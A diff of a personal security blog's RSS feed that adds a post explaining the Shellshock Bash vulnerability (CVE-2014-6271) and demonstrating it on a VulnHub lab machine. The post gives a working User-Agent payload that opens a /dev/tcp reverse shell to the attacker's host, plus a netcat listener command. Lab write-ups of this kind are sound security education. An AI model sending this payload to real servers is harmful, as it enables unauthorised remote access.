@@ -6,8 +6,107 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Sun, 16 Mar 2025 20:52:36 +0000</lastBuildDate>
+        <lastBuildDate>Tue, 18 Mar 2025 19:47:45 +0000</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>Test</title>
+            <link>/posts/test/</link>
+            <pubDate>Tue, 18 Mar 2025 19:47:45 +0000</pubDate>
+            
+            <guid>/posts/test/</guid>
+            <description></description>
+            <content type="html"><![CDATA[]]></content>
+        </item>
+        
+        <item>
+            <title>Shellshock : Explanation &#43; Demonstration (CVE-2014-6271)</title>
+            <link>/posts/shellshock/</link>
+            <pubDate>Mon, 17 Mar 2025 23:59:52 +0000</pubDate>
+            
+            <guid>/posts/shellshock/</guid>
+            <description>&lt;h2 id=&#34;what-is-shellshock-cve-2014-6271&#34;&gt;What is Shellshock (CVE-2014-6271)?&lt;/h2&gt;
+&lt;p&gt;Basically, Shellshock is a &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2014-6271&#34;&gt;critical&lt;/a&gt; vulnerability in Bash (versions 1.03 through 4.3) that allows attackers to perform arbitrary commands executions due to a flaw in Bash&amp;rsquo;s handling of environment variables.&lt;/p&gt;
+&lt;h3 id=&#34;environment-variables-&#34;&gt;Environment variables ?&lt;/h3&gt;
+&lt;p&gt;Environment variables are a simple way to pass about the current operating environment to the program being executed. You can define one simply by typing :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;variable&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And you can use it as you would use a variable in a programming language.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h2 id="what-is-shellshock-cve-2014-6271">What is Shellshock (CVE-2014-6271)?</h2>
+<p>Basically, Shellshock is a <a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">critical</a> vulnerability in Bash (versions 1.03 through 4.3) that allows attackers to perform arbitrary commands executions due to a flaw in Bash&rsquo;s handling of environment variables.</p>
+<h3 id="environment-variables-">Environment variables ?</h3>
+<p>Environment variables are a simple way to pass about the current operating environment to the program being executed. You can define one simply by typing :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>variable<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;test&#34;</span>
+</span></span></code></pre></div><p>And you can use it as you would use a variable in a programming language.</p>
+
+    <img src="/screens/shellshock/bash-1.png"  alt="bash-1"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+<p><em>note : There&rsquo;s more depth to this, if you want to read more about it, I recommend this [article https://linuxize.com/post/how-to-set-and-list-environment-variables-in-linux/).</em></p>
+<hr>
+<p>The root of the problem comes from Bash executing arbitrary commands coming after function declarations. Bash continued to process and execute additional code that followed a function definition within the environment variable. This behavior was unexpected and dangerous. An attacker could exploit this by injecting malicious commands into the environment variables passed to Bash through CGI.</p>
+<h3 id="common-gateway-interface-cgi">Common Gateway Interface (CGI)</h3>
+<p>CGI is a protocol used by a web server to execute external commands/scripts and pass the results back to the client (a web browser).</p>
+<p>This makes it easy to have interactions between client and server to have dynamic web pages or to be able to easily process data.</p>
+
+    <img src="/screens/shellshock/env.png"  alt="environment-1"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+<p>Note : Learn more about CGI <a href="https://en.wikipedia.org/wiki/Common_Gateway_Interface">here</a>.</p>
+<hr>
+<h2 id="demonstration">Demonstration</h2>
+<p>I found a vulnerable machine on <a href="https://www.vulnhub.com/">VULNHUB</a> and set it up on VMware. You can download it <a href="https://github.com/Yassine-elhammoumi/Yassine-elhammoumi.github.io/raw/refs/heads/main/public/screens/shellshock/cve-2014-6271.iso">here</a>.</p>
+
+    <img src="/screens/shellshock/vmware-1.png"  alt="vmware-1"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>I got the ip address from the machine using <em>ifconfig</em> (<strong>172.16.116.129</strong>).</p>
+
+    <img src="/screens/shellshock/vmware-2.png"  alt="vmware-2"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>I started up burp suite and navigated to the web server on (<strong>172.16.116.129</strong>, we find a simple web page.</p>
+<hr>
+<p>Note : Don&rsquo;t forget to set up <a href="https://aatharvauti.github.io/burpsuite/x.%20Foxy%20Proxy.html">foxy proxy</a></p>
+<hr>
+
+    <img src="/screens/shellshock/webpage.png"  alt="webpage-1"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<hr>
+
+    <img src="/screens/shellshock/burp-1.png"  alt="burp-1"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p>I sent the request to the repeater and changed the User-Agent into :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :; <span style="color:#f92672">}</span>; echo; echo; /bin/bash -c <span style="color:#e6db74">&#39;bash -i&gt;&amp;/dev/tcp/172.16.116.1/1234  0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><hr>
+<h3 id="breakdown-of-the-command">Breakdown of the command</h3>
+<ul>
+<li><strong>()</strong> : Nameless function declaration.</li>
+<li><strong>{ :; }</strong> : Empty function body (: is built-in shell command that does nothing (a no-op)).</li>
+<li><strong>/bin/bash -c</strong> : Tells the system to execute a command with Bash.</li>
+<li><strong>bash -i</strong> : To run bash in interactive mode (-i).</li>
+<li><strong>&gt;&amp;/dev/tcp/172.16.116.1/1234</strong> : It attempts to open a connection to the IP address 172.16.116.1 on port 1234 (/dev/tcp/172.16.116.1/1234) and redirects the output of the Bash shell (&gt;&amp;).</li>
+</ul>
+<hr>
+
+    <img src="/screens/shellshock/burp-2.png"  alt="burp-2"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<p><strong>172.16.116.1</strong> being my ip address for the VMware network interface.</p>
+<p>I then sat up a listener before sending the request.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">1234</span>
+</span></span></code></pre></div><p>And we&rsquo;re done, we have access to the system through Netcat.</p>
+
+    <img src="/screens/shellshock/nc.png"  alt="netcat"  class="center"  style="border-radius: 8px; width: 100%;"  />
+
+
+<h2 id="conclusion">Conclusion</h2>
+<p>That&rsquo;s it, this is an old vulnerability, but I wanted to showcase it and have a simple proof of concept for people to try.</p>
+]]></content>
+        </item>
         
         <item>
             <title>(INE - eJPT) Assessment Methodologies: Vulnerability Assessment CTF 1</title>
@@ -29,7 +128,7 @@
 
 
 <p>We can see that the ports <strong>80</strong> and <strong>3306</strong> are open on the host&rsquo;s IP <strong>192.194.77.3</strong> so it must be our target (the <em>target.ine.local</em> helps too).</p>
-<p>I then opened the browser to look at the web server (since port 80 is open) and i found an OWASP app.</p>
+<p>I then opened the browser to look at the web server (since port 80 is open) and I found an OWASP app.</p>
 
     <img src="/screens/owasp-1.png"  alt="OWASP app"  class="center"  style="border-radius: 8px; width: 100%;"  />
 
